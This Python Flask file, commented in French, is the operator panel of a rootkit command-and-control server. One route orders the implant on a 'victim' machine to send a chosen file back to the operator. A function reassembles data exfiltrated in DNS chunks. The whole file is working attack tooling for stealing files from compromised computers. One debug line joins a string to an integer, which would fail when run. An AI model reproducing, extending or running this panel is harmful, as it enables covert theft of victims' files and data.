from app import app
import config as cfg
from flask import render_template, redirect, url_for, request, flash
import os, time
from utils.server import TCPServer

# --------------------------------- LISTE DES FICHIERS --------------------------------- #

@app.route('/download')
def download():
    # Liste les fichiers déjà téléchargés en local
    files = os.listdir(cfg.DOWNLOAD_FOLDER)
    return render_template("download.html", files=files)

# ---------------------- TÉLÉCHARGER UN FICHIER DEPUIS LA VICTIME ---------------------- #

@app.route('/download-remote', methods=['POST'])
def download_remote():
    remote_path = request.form.get('remote_path')
    filename = os.path.basename(remote_path)
    local_path = os.path.join(cfg.DOWNLOAD_FOLDER, filename)

    try:
        # 1. Demande le fichier
        print(f"Envoi commande : download " + remote_path)
        response = cfg.rootkit_connexion.send_to_client(f"download {remote_path}")
        if not response or not response.startswith("SIZE "):
            flash(f"❌ Fichier indisponible ou erreur : {response}", "error")
            return redirect(url_for('download'))

        # 2. Taille du fichier
        size = int(response.split()[1])
        print(f"[DEBUG] Taille du fichier : " + size)
        print(f"[DEBUG] Envoi READY")
        cfg.rootkit_connexion.send_to_client("READY")

        # 3. Réception
        print(f"[DEBUG] Reception data")
        data = cfg.rootkit_connexion._network_handler.receive(
            cfg.rootkit_connexion._client_socket
        )

        # 🔍 Correction ici : tester explicitement les échecs
        print(f"[DEBUG] IF")
        if data is False or data is None:
            flash("❌ Échec de la réception du fichier (données absentes ou erreur réseau).", "error")
            return redirect(url_for('download'))
        print(f"[DEBUG] ENDIF")

        # 🔎 Debug (optionnel) : log des 100 premiers caractères
        print(f"[DEBUG] Fichier reçu ({len(data)} octets) : {repr(data[:100])}")

        print(f"[DEBUG] Sauvegarde dans : {local_path}")

        # 4. Écriture du fichier
        with open(local_path, "wb") as f:
            f.write(data.encode("latin1") if isinstance(data, str) else data)

        flash(f"✅ Fichier téléchargé : {filename}", "success")
        return redirect(url_for('download'))

    except Exception as e:
        flash(f"❌ Erreur pendant le téléchargement : {e}", "error")
        return redirect(url_for('download'))

# --------------------------- EXFIL ASSEMBLY (DNS) --------------------------- #

def assemble_exfil(timeout=cfg.DNS_RESPONSE_TIMEOUT, poll=cfg.DNS_POLL_INTERVAL):
    """
    Attend jusqu'à `timeout` secondes pour recevoir tous les chunks DNS
    puis assemble les données exfiltrées.
    """

    start = time.time()

    while True:
        if cfg.expected_chunks is not None and len(cfg.exfil_buffer) >= cfg.expected_chunks:
            break
        if time.time() - start > timeout:
            break
        time.sleep(poll)

    if cfg.expected_chunks is not None and len(cfg.exfil_buffer) >= cfg.expected_chunks:
        data = b''.join(cfg.exfil_buffer[i] for i in range(cfg.expected_chunks))
        text = data.decode(errors='ignore')
    else:
        text = ""

    # Reset buffers
    cfg.expected_chunks = None
    cfg.exfil_buffer.clear()
    return text
